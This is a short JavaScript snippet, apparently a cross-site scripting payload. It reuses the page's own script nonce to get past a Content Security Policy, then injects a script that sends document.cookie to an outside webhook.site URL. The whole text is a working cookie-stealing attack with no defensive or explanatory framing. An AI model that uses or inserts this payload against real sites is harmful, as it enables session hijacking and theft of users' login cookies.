const legitNonce = document.currentScript.nonce;
const s = document.createElement('script');
s.nonce = legitNonce;
s.textContent = `fetch('https://webhook.site/39e1f325-6799-4e48-ad5c-a5ca2167ad0d?q=' + document.cookie)`;
document.head.appendChild(s);
